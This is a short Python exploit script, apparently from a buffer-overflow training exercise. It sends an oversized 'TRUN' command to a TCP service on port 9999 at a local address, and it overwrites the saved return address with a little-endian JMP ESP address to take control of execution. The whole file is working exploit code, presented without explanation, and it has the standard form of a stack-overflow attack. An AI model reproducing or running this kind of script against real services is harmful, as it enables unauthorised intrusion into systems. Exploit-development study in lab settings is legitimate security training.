#!/usr/bin/python

import socket
import os
import sys

host="192.168.0.6"
port=9999

# 77A373CD   FFE4             JMP ESP
#x86 stores in little endian, reverse address 625011AF \xcd\x73\xa3\x77 \xAF\x11\x50\x62
buffer = "TRUN /.:/" + "A" * 2003 + "\xAF\x11\x50\x62" +"C"*(3000 - 2003 - 4)

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()